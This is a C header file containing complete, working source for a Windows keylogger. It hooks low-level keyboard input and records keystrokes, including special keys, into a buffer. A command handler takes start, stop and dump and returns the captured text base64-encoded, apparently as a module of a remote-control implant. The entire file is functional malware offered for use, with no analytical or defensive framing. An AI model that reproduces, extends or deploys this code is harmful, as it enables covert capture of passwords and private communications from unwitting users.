#ifndef APEX_KEYLOGGER_H
#define APEX_KEYLOGGER_H

/*
 * Windows keylogger using low-level keyboard hook (WH_KEYBOARD_LL).
 * Runs in a dedicated thread with a message pump.
 *
 * Commands:
 *   keylogger start  — Begin capturing keystrokes
 *   keylogger stop   — Stop capturing and return buffer
 *   keylogger dump   — Return current buffer without stopping
 */

#ifdef _WIN32

#include <windows.h>

#define KEYLOG_BUF_SIZE 32768

static char          g_keylog_buf[KEYLOG_BUF_SIZE];
static volatile LONG g_keylog_pos = 0;
static volatile LONG g_keylog_running = 0;
static HANDLE        g_keylog_thread = NULL;
static HHOOK         g_keylog_hook = NULL;
static DWORD         g_keylog_tid = 0;

static void keylog_append(const char *s, int len) {
    LONG pos = InterlockedAdd(&g_keylog_pos, 0);
    if (pos + len + 1 >= KEYLOG_BUF_SIZE) return;
    LONG newpos = InterlockedExchangeAdd(&g_keylog_pos, (LONG)len);
    if (newpos + len < KEYLOG_BUF_SIZE)
        memcpy(g_keylog_buf + newpos, s, (size_t)len);
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vk = kbs->vkCode;

        /* Map virtual key to readable string */
        char keyname[32] = "";
        int special = 1;

        switch (vk) {
            case VK_RETURN:   strcpy(keyname, "[ENTER]\n"); break;
            case VK_TAB:      strcpy(keyname, "[TAB]"); break;
            case VK_SPACE:    strcpy(keyname, " "); break;
            case VK_BACK:     strcpy(keyname, "[BS]"); break;
            case VK_ESCAPE:   strcpy(keyname, "[ESC]"); break;
            case VK_CAPITAL:  strcpy(keyname, "[CAPS]"); break;
            case VK_LSHIFT: case VK_RSHIFT:   strcpy(keyname, ""); break;
            case VK_LCONTROL: case VK_RCONTROL: strcpy(keyname, "[CTRL]"); break;
            case VK_LMENU: case VK_RMENU:     strcpy(keyname, "[ALT]"); break;
            case VK_LWIN: case VK_RWIN:       strcpy(keyname, "[WIN]"); break;
            case VK_DELETE:   strcpy(keyname, "[DEL]"); break;
            case VK_LEFT:     strcpy(keyname, "[LEFT]"); break;
            case VK_RIGHT:    strcpy(keyname, "[RIGHT]"); break;
            case VK_UP:       strcpy(keyname, "[UP]"); break;
            case VK_DOWN:     strcpy(keyname, "[DOWN]"); break;
            default: special = 0; break;
        }

        if (special) {
            if (keyname[0])
                keylog_append(keyname, (int)strlen(keyname));
        } else {
            BYTE keyState[256] = {0};
            GetKeyboardState(keyState);
            WCHAR wc[4] = {0};
            int res = ToUnicode(vk, kbs->scanCode, keyState, wc, 4, 0);
            if (res > 0) {
                char mb[8] = {0};
                WideCharToMultiByte(CP_UTF8, 0, wc, res, mb, sizeof(mb), NULL, NULL);
                keylog_append(mb, (int)strlen(mb));
            }
        }
    }
    return CallNextHookEx(g_keylog_hook, nCode, wParam, lParam);
}

static DWORD WINAPI KeyloggerThread(LPVOID param) {
    (void)param;
    g_keylog_hook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!g_keylog_hook) {
        InterlockedExchange(&g_keylog_running, 0);
        return 1;
    }

    MSG msg;
    while (InterlockedAdd(&g_keylog_running, 0) && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_keylog_hook);
    g_keylog_hook = NULL;
    return 0;
}

static void handle_keylogger(const char *args, char *out_b64) {
    if (!args || !args[0] || strcmp(args, "start") == 0) {
        if (InterlockedAdd(&g_keylog_running, 0)) {
            b64_encode((unsigned char*)"Keylogger already running", 25, out_b64);
            return;
        }
        InterlockedExchange(&g_keylog_pos, 0);
        memset(g_keylog_buf, 0, KEYLOG_BUF_SIZE);
        InterlockedExchange(&g_keylog_running, 1);
        g_keylog_thread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, &g_keylog_tid);
        if (!g_keylog_thread) {
            InterlockedExchange(&g_keylog_running, 0);
            b64_encode((unsigned char*)"Failed to start keylogger", 25, out_b64);
        } else {
            b64_encode((unsigned char*)"Keylogger started", 17, out_b64);
        }
    } else if (strcmp(args, "stop") == 0) {
        if (!InterlockedAdd(&g_keylog_running, 0)) {
            b64_encode((unsigned char*)"Keylogger not running", 21, out_b64);
            return;
        }
        InterlockedExchange(&g_keylog_running, 0);
        if (g_keylog_tid)
            PostThreadMessage(g_keylog_tid, WM_QUIT, 0, 0);
        if (g_keylog_thread) {
            WaitForSingleObject(g_keylog_thread, 3000);
            CloseHandle(g_keylog_thread);
            g_keylog_thread = NULL;
        }
        LONG pos = InterlockedAdd(&g_keylog_pos, 0);
        if (pos > 0)
            b64_encode((unsigned char*)g_keylog_buf, (size_t)pos, out_b64);
        else
            b64_encode((unsigned char*)"Keylogger stopped (no keystrokes captured)", 42, out_b64);
        InterlockedExchange(&g_keylog_pos, 0);
    } else if (strcmp(args, "dump") == 0) {
        LONG pos = InterlockedAdd(&g_keylog_pos, 0);
        int running = InterlockedAdd(&g_keylog_running, 0);
        if (pos > 0) {
            char hdr[64];
            snprintf(hdr, sizeof(hdr), "[%s, %ld chars]\n", running ? "running" : "stopped", (long)pos);
            size_t hlen = strlen(hdr);
            char *combined = (char *)malloc(hlen + (size_t)pos + 1);
            if (combined) {
                memcpy(combined, hdr, hlen);
                memcpy(combined + hlen, g_keylog_buf, (size_t)pos);
                b64_encode((unsigned char*)combined, hlen + (size_t)pos, out_b64);
                free(combined);
            } else {
                b64_encode((unsigned char*)g_keylog_buf, (size_t)pos, out_b64);
            }
        } else {
            b64_encode((unsigned char*)"No keystrokes captured yet", 26, out_b64);
        }
    } else {
        const char *msg = "Usage: keylogger [start|stop|dump]";
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
    }
}

#endif /* _WIN32 */
#endif /* APEX_KEYLOGGER_H */
